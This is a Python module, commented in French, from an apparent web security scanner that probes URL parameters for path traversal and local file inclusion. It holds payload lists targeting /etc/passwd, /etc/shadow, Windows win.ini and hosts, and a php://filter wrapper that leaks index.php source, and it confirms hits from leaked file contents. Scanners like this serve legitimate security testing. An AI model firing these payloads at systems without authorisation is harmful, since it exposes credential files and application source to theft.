#!/usr/bin/env python3
"""
📁 LFI Path Traversal — OWASP A05:2025
Lecture de fichiers sensibles. Détection OS serveur + preuves strictes (vrais positifs uniquement).
"""

from colorama import Fore, Style

# Payloads Linux uniquement (preuves /etc/passwd)
LFI_LINUX = [
    "../../../etc/passwd", "../../../../etc/passwd", "../../../../../etc/passwd",
    "/etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "....//....//....//etc/passwd",
]
# Payloads Windows uniquement (preuves win.ini)
LFI_WINDOWS = [
    "../../../../windows/win.ini", "../../../../windows/system32/drivers/etc/hosts",
    "..%2f..%2f..%2f..%2fwindows%2fwin.ini",
]
# Indicateurs stricts : contenu réel du fichier (pas le nom du fichier)
LINUX_PASSWD_MUST = ['root:x:0:0', 'daemon:x:1:1', 'bin:x:2:2']  # Au moins 2 lignes pour confirmer
LINUX_PASSWD_ANY = ['root:x:0:0']
WINDOWS_WININI_MUST = ['[boot loader]', '[fonts]']  # Sections win.ini
WINDOWS_WININI_ANY = ['[boot loader]']


def _detect_server_os(resp):
    """Détecte Linux vs Windows depuis headers et contenu."""
    h = str(resp.headers).lower()
    t = resp.text[:5000].lower()
    # Windows / IIS / .NET
    if any(x in h or x in t for x in ['iis', 'microsoft', 'asp.net', 'windows-', 'x-aspnet']):
        return 'windows'
    # Linux / Apache / nginx / PHP
    if any(x in h or x in t for x in ['apache', 'nginx', 'php', 'x-powered-by: php', 'linux']):
        return 'linux'
    return 'unknown'  # Par défaut: Linux (PrestaShop, WordPress, etc.)


class LFITraversal:
    def __init__(self, engine, aggressive=False):
        self.engine = engine
        self.aggressive = aggressive
        self._timeout = getattr(engine, 'request_timeout', 5)

    def scan(self, params):
        print(f"\n{Fore.BLUE}[📁 LFI PATH TRAVERSAL] {Style.RESET_ALL}\n")

        try:
            baseline = self.engine.get_baseline()
            server_os = _detect_server_os(baseline)
        except Exception:
            baseline = None
            server_os = 'linux'  # défaut

        # N'utiliser que les payloads adaptés à l'OS
        if server_os == 'windows':
            lfi_payloads = LFI_WINDOWS
        else:
            lfi_payloads = list(LFI_LINUX)
            if self.aggressive:
                lfi_payloads += ["..%252f..%252f..%252fetc%252fpasswd", "../../../../etc/shadow",
                                 "php://filter/convert.base64-encode/resource=index.php"]

        vulnerabilities = []
        get = getattr(self.engine, 'get', self.engine.session.get)

        for param in params:
            print(f"  {Fore.BLUE}→ Test paramètre: {Fore.YELLOW}{param}{Style.RESET_ALL}")
            for payload in lfi_payloads:
                injected_url = self.engine.build_url(param, payload)
                if not injected_url:
                    continue
                try:
                    resp = get(injected_url, timeout=self._timeout)
                    if any(p in resp.text.lower() for p in ['sql syntax', 'mysql error', 'pdoexception', 'sqlstate']):
                        continue
                    # Preuves strictes selon le type de payload
                    if 'passwd' in payload or 'shadow' in payload:
                        if sum(1 for ind in LINUX_PASSWD_MUST if ind in resp.text) >= 2:
                            vuln = {'type': 'lfi', 'cwe': 'CWE-22', 'param': param, 'payload': payload,
                                    'url': injected_url, 'evidence': 'Contenu /etc/passwd confirmé (root, daemon, bin)'}
                            vulnerabilities.append(vuln)
                            self._print_vuln(vuln)
                            break
                        if 'root:x:0:0' in resp.text and 'daemon:x:1' in resp.text:
                            vuln = {'type': 'lfi', 'cwe': 'CWE-22', 'param': param, 'payload': payload,
                                    'url': injected_url, 'evidence': 'Contenu /etc/passwd confirmé'}
                            vulnerabilities.append(vuln)
                            self._print_vuln(vuln)
                            break
                    elif 'win.ini' in payload or 'hosts' in payload.lower():
                        if any(ind in resp.text for ind in WINDOWS_WININI_MUST):
                            vuln = {'type': 'lfi', 'cwe': 'CWE-22', 'param': param, 'payload': payload,
                                    'url': injected_url, 'evidence': 'Contenu win.ini/hosts confirmé'}
                            vulnerabilities.append(vuln)
                            self._print_vuln(vuln)
                            break
                except Exception:
                    continue

        return vulnerabilities
    
    def _print_vuln(self, vuln):
        print(f"\n    {Fore.BLUE}[💥 LFI CONFIRMÉ] {Style.RESET_ALL}{vuln['param']}")
        print(f"      Payload: {vuln['payload']}")
        print(f"      Preuve: {vuln['evidence']}")
        print(f"      URL: {vuln['url']}\n")